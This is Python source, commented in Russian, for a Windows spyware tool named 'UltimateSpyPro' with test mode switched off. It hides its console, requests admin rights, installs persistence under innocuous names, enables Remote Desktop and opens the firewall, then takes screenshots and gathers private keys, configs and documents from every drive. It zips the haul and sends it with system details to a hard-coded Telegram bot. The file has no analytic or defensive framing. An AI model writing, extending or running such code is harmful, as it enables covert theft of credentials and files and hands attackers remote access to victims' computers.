import os
import sys
import zipfile
import platform
import glob
import shutil
import tempfile
import requests
import pyautogui
import socket
import subprocess
import ctypes
import winreg as reg
import json
from datetime import datetime
from collections import defaultdict
import asyncio
import msvcrt

# ===== НАСТРОЙКИ =====
TEST_MODE = False  # Отключаем тестовый режим
MAX_FILE_SIZE = 150 * 1024 * 1024
MAX_ARCHIVE_SIZE = 1.5 * 1024 * 1024 * 1024

# Настройки модулей
SETTINGS = {
    'screenshots': True,
    'collect_files': True,
    'browser_data': True,
    'system_info': True,
    'enable_rdp': True,
    'persistence': True,
}

# Конфигурация Telegram
BOT_TOKEN = '7634580127:AAFSXUSikUV7aufMB46sfu6pTLQMe7I9GF4'
CHAT_ID = '1409843630'

class UltimateSpyPro:
    def __init__(self):
        self.pc_name = platform.node()
        self.user_name = os.getlogin()
        self.temp_dir = tempfile.gettempdir()
        self.is_admin = False
        self.lock_file = os.path.join(self.temp_dir, 'spy_lock')
        self.emoji = {
            'pc': '🖥️', 'time': '⏱️', 'archive': '📦',
            'password': '🔑', 'screenshot': '🖼️',
            'doc': '📄', 'warning': '⚠️', 'success': '✅',
            'error': '❌', 'rdp': '🔓', 'folder': '📁'
        }

    def check_lock(self):
        try:
            with open(self.lock_file, 'w') as f:
                msvcrt.locking(f.fileno(), msvcrt.LK_NBLCK, 1)
            return True
        except (IOError, OSError):
            return False

    def release_lock(self):
        try:
            if os.path.exists(self.lock_file):
                os.remove(self.lock_file)
        except Exception:
            pass

    def run_as_admin(self):
        try:
            self.is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not self.is_admin and not TEST_MODE:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{sys.argv[0]}"', None, 1)
                sys.exit(0)
            return self.is_admin
        except Exception:
            self.is_admin = False
            return False

    def set_persistence(self):
        if not SETTINGS['persistence'] or TEST_MODE:
            return False

        if not self.is_admin:
            return False

        try:
            key = reg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with reg.OpenKey(key, key_path, 0, reg.KEY_WRITE) as reg_key:
                reg.SetValueEx(reg_key, "WindowsSystemHelper", 0, reg.REG_SZ, sys.executable)

            task_cmd = f'schtasks /create /tn "SystemHelper" /tr "{sys.executable}" /sc onlogon /rl highest'
            subprocess.run(task_cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except Exception:
            return False

    def enable_rdp(self):
        if not SETTINGS['enable_rdp'] or TEST_MODE:
            return False

        if not self.is_admin:
            return False

        try:
            subprocess.run([
                'reg', 'add',
                'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server',
                '/v', 'fDenyTSConnections', '/t', 'REG_DWORD', '/d', '0', '/f'
            ], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run([
                'netsh', 'advfirewall', 'firewall', 'set', 'rule',
                'group="remote desktop"', 'new', 'enable=yes'
            ], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except Exception:
            return False

    def take_screenshot(self):
        if not SETTINGS['screenshots']:
            return None

        try:
            screenshot = pyautogui.screenshot()
            screenshot_path = os.path.join(self.temp_dir, f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
            screenshot.save(screenshot_path)
            if os.path.getsize(screenshot_path) > MAX_FILE_SIZE:
                os.remove(screenshot_path)
                return None
            return screenshot_path
        except Exception:
            return None

    async def collect_files_async(self, location, category, extensions):
        found_files = []
        if not os.path.exists(location):
            return found_files

        try:
            for ext in extensions:
                files = glob.glob(os.path.join(location, f'*{ext}'))
                file_limit = 3 if category != 'downloads' else None
                for file_path in files[:file_limit]:
                    try:
                        file_size = os.path.getsize(file_path)
                        if file_size <= MAX_FILE_SIZE:
                            found_files.append((file_path, category))
                    except Exception:
                        pass
        except Exception:
            pass
        return found_files

    async def collect_files(self):
        if not SETTINGS['collect_files']:
            return {}

        file_types = {
            'json': ['.json'],
            'keys': ['.key', '.keys', '.pem', '.ppk', '.pub'],
            'txt': ['.txt', '.cfg', '.conf', '.doc', '.docx'],
            'downloads': ['.txt', '.cfg', '.conf', '.doc', '.docx', '.json', '.key', '.keys', '.pem', '.ppk', '.pub'],
        }

        found_files = []
        search_locations = []

        downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        if os.path.exists(downloads_path):
            search_locations.append(downloads_path)

        desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
        if os.path.exists(desktop_path):
            search_locations.append(desktop_path)

        search_locations.append('C:\\')
        other_drives = [f'{d}:\\' for d in 'DEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f'{d}:\\')]
        for drive in other_drives:
            if os.path.exists(drive):
                search_locations.append(drive)

        tasks = [
            self.collect_files_async(location, category, extensions)
            for location in search_locations
            for category, extensions in file_types.items()
            if category != 'keys' or location.endswith('Downloads') or location == 'C:\\'
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, list):
                found_files.extend(result)

        grouped_files = defaultdict(list)
        for file_path, category in found_files:
            ext = os.path.splitext(file_path)[1].lower()
            if ext in ['.txt', '.cfg', '.conf', '.doc', '.docx']:
                grouped_files['txt'].append(file_path)
            elif ext in ['.json']:
                grouped_files['json'].append(file_path)
            elif ext in ['.key', '.keys', '.pem', '.ppk', '.pub']:
                grouped_files['keys'].append(file_path)

        return grouped_files

    def collect_system_info(self):
        if not SETTINGS['system_info']:
            return {}

        info = {
            'system': {
                'pc_name': self.pc_name,
                'user_name': self.user_name,
                'os': f"{platform.system()} {platform.release()}",
                'architecture': platform.architecture()[0],
                'processor': platform.processor(),
            },
            'network': {
                'hostname': socket.gethostname(),
                'ip_address': socket.gethostbyname(socket.gethostname()),
            },
            'storage': {},
            'rdp_access': {
                'enabled': False,
                'connection_string': None
            }
        }

        try:
            drives = []
            for drive in ['C:\\'] + [f'{d}:\\' for d in 'DEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f'{d}:\\')]:
                if os.path.exists(drive):
                    total, used, free = shutil.disk_usage(drive)
                    drives.append({
                        'drive': drive,
                        'total': f"{total // (2**30)} GB",
                        'used': f"{used // (2**30)} GB",
                        'free': f"{free // (2**30)} GB"
                    })
            info['storage']['drives'] = drives
        except Exception:
            pass

        return info

    def create_archive(self, files, system_info):
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        zip_files = []
        current_zip = []
        current_size = 0
        zip_index = 1

        def create_new_zip():
            nonlocal zip_index
            zip_name = os.path.join(self.temp_dir, f"{timestamp}-{self.pc_name}-data-part{zip_index}.zip")
            try:
                with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for file_path, arcname in current_zip:
                        try:
                            zipf.write(file_path, arcname)
                        except Exception:
                            pass
                zip_files.append(zip_name)
            except Exception:
                pass
            return zip_name

        try:
            all_files = []
            for category, file_list in files.items():
                for file_path in file_list:
                    arcname = os.path.join('files', category, os.path.basename(file_path))
                    all_files.append((file_path, arcname))
            if system_info:
                info_file = os.path.join(self.temp_dir, 'system_info.json')
                with open(info_file, 'w', encoding='utf-8') as f:
                    json.dump(system_info, f, indent=2, ensure_ascii=False)
                all_files.append((info_file, 'system_info.json'))

            for file_path, arcname in all_files:
                try:
                    file_size = os.path.getsize(file_path)
                    if current_size + file_size > MAX_ARCHIVE_SIZE and current_zip:
                        create_new_zip()
                        current_zip = []
                        current_size = 0
                        zip_index += 1
                    current_zip.append((file_path, arcname))
                    current_size += file_size
                except Exception:
                    pass

            if current_zip:
                create_new_zip()

            return zip_files
        except Exception:
            return []

    def send_message(self, screenshot_path):
        system_info = self.collect_system_info()
        max_retries = 3
        for attempt in range(max_retries):
            try:
                message = (
                    f"{self.emoji['pc']} *Данные с компьютера* `{self.pc_name}`\n\n"
                    f"{self.emoji['time']} *Время:* {datetime.now().strftime('%d.%m.%Y %H:%M')}\n"
                    f"👤 *Пользователь:* {system_info['system']['user_name']}\n"
                    f"🖥 *ОС:* {system_info['system']['os']}\n"
                    f"🌐 *IP:* `{system_info['network']['ip_address']}`\n"
                )

                if 'drives' in system_info['storage']:
                    message += f"\n{self.emoji['folder']} *Диски:*\n"
                    for drive in system_info['storage']['drives']:
                        message += f"  • {drive['drive']} - {drive['free']} свободно из {drive['total']}\n"

                if system_info['rdp_access']['enabled']:
                    message += (
                        f"\n{self.emoji['rdp']} *RDP доступ включен!*\n"
                        f"Подключиться: `{system_info['rdp_access']['connection_string']}`\n"
                        f"Логин: `{system_info['system']['user_name']}`\n"
                    )
                else:
                    message += f"\n{self.emoji['rdp']} *RDP доступ не включен* (требуются права администратора)\n"

                if screenshot_path and os.path.exists(screenshot_path):
                    with open(screenshot_path, 'rb') as photo:
                        response = requests.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                            files={'photo': photo},
                            data={
                                'chat_id': CHAT_ID,
                                'caption': message,
                                'parse_mode': 'Markdown'
                            },
                            timeout=15
                        )
                        response.raise_for_status()
                else:
                    response = requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        data={
                            'chat_id': CHAT_ID,
                            'text': message,
                            'parse_mode': 'Markdown'
                        },
                        timeout=10
                    )
                    response.raise_for_status()
                return system_info
            except Exception:
                if attempt < max_retries - 1:
                    asyncio.sleep(2)
        return system_info

    async def send_archive_async(self, zip_path, index):
        if not zip_path or not os.path.exists(zip_path):
            return False

        max_retries = 3
        for attempt in range(max_retries):
            try:
                with open(zip_path, 'rb') as f:
                    response = requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                        files={'document': f},
                        data={
                            'chat_id': CHAT_ID,
                            'caption': f"{self.emoji['archive']} Архив данных (часть {index})"
                        },
                        timeout=60
                    )
                    response.raise_for_status()
                return True
            except Exception:
                if attempt < max_retries - 1:
                    await asyncio.sleep(2)
        return False

    async def send_archives(self, zip_paths):
        tasks = [self.send_archive_async(zip_path, i + 1) for i, zip_path in enumerate(zip_paths)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return all(results)

    async def execute(self):
        if not self.check_lock():
            return

        try:
            self.run_as_admin()

            rdp_status = self.enable_rdp() if self.is_admin else False
            self.set_persistence() if self.is_admin else False

            screenshot = self.take_screenshot()
            system_info = self.send_message(screenshot)

            system_info['rdp_access']['enabled'] = rdp_status
            if rdp_status:
                system_info['rdp_access']['connection_string'] = f"{system_info['network']['ip_address']}:3389"

            files = await self.collect_files()
            zip_paths = self.create_archive(files, system_info)

            await self.send_archives(zip_paths)

            for file in zip_paths:
                try:
                    if file and os.path.exists(file):
                        os.remove(file)
                except Exception:
                    pass
        finally:
            self.release_lock()

def hide_console():
    if platform.system() == 'Windows' and not TEST_MODE:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

async def main():
    hide_console()
    spy = UltimateSpyPro()
    await spy.execute()

if __name__ == "__main__":
    asyncio.run(main())